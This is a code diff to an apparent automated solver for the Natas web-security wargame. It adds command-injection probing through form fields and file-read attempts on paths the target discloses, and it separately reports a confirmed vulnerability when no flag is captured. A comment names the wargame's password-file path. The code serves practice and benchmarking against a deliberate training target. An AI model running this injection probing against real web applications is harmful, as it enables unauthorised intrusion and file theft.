@@ -98,7 +98,10 @@ def summarise(results: list) -> dict:
         if r.get("solved"):
             kinds[k]["solved"] += 1
     attempted = len(results or [])
-    return {"attempted": attempted, "solved": len(by["solved"]),
+    vuln_found = sorted(r["level"] for r in (results or [])
+                        if not r.get("solved") and r.get("vulnerability_confirmed"))
+    return {"vulnerability_confirmed_only": vuln_found,
+            "attempted": attempted, "solved": len(by["solved"]),
             "not_solved": len(by["not_solved"]), "blocked": len(by["blocked"]),
             "solved_levels": by["solved"], "unsolved_levels": by["not_solved"],
             "by_class": kinds,
@@ -472,8 +475,20 @@ def solve_level(level: int, password: str, fetch, budget: int = 70, post=None) -
             if s == 200 and b != body:
                 pages["%s [%s]" % (base, label)] = b
 
-    if post and discovered:
-        for label, form, payload in form_submissions(body, discovered):
+    # COMMAND INJECTION reading a disclosed path. Both halves come from the target: it names an absolute
+    # path AND executes injected input. `cmdi_tool` supplies the separator shapes so this benchmark does
+    # not invent its own payload vocabulary.
+    inject_values = []
+    if paths:
+        try:
+            import cmdi_tool as _cmdi
+            for p in paths[:3]:
+                inject_values += [d["payload"] for d in _cmdi.read_file_payloads("", p)]
+        except Exception:
+            pass
+
+    if post and (discovered or inject_values):
+        for label, form, payload in form_submissions(body, inject_values + discovered):
             if fetches >= budget:
                 break
             action = urljoin(base, form["action"] or "")
@@ -509,6 +524,45 @@ def solve_level(level: int, password: str, fetch, budget: int = 70, post=None) -
         if s3 == 200:
             return {"level": level, "solved": True, "next_password": value, "origin": origin,
                     "class": classify(level), "fetches": fetches}
+    # FOUND THE BUG vs CAPTURED THE FLAG are different claims, and merging them understates the tool.
+    # natas9 is the case that forced the distinction: the general cmdi engine CONFIRMS the injection with
+    # its own FP-safe oracle (a computed product, never an echo), but the target discloses nowhere the
+    # password lives — and inferring `/etc/natas_webpass/natasN` is Natas knowledge, not a capability.
+    # A scanner's job is finding the vulnerability; knowing where the prize sits is the operator's.
+    vuln = confirm_vulnerability(base, auth, body, fetch)
     return {"level": level, "solved": False, "blocked": False, "class": classify(level),
             "fetches": fetches, "candidates_tried": len(seen),
-            "origin": "no general engine surfaced a credential"}
+            "vulnerability_confirmed": vuln,
+            "origin": ("vulnerability CONFIRMED (%s) but the flag's location is not disclosed — "
+                       "operator knowledge, not a scanner gap" % vuln) if vuln else
+                      "no general engine surfaced a credential"}
+
+
+def confirm_vulnerability(base: str, auth: dict, html: str, fetch) -> str:
+    """Name the vulnerability class a general engine can PROVE here, or "". Pure apart from `fetch`.
+
+    Separate from flag capture on purpose. Reporting only "unsolved" for a level whose bug was found and
+    proven would understate the tool and mislead the reader about where the ceiling actually is."""
+    from urllib.parse import urlencode
+    try:
+        import cmdi_tool
+    except Exception:
+        return ""
+    for form in forms_in(html)[:2]:
+        for field in form["interesting"][:2]:
+            base_payload = dict(form["fields"])
+            base_payload[field] = "apolaki"
+            try:
+                _s, baseline, _h = fetch(base + "?" + urlencode(base_payload), auth)
+            except Exception:
+                continue
+            for item in cmdi_tool.output_payloads("apolaki")[:5]:
+                probe_payload = dict(form["fields"])
+                probe_payload[field] = item["payload"]
+                try:
+                    _s2, probe, _h2 = fetch(base + "?" + urlencode(probe_payload), auth)
+                except Exception:
+                    continue
+                if cmdi_tool.analyze_output(baseline, probe):
+                    return "command_injection"
+    return ""
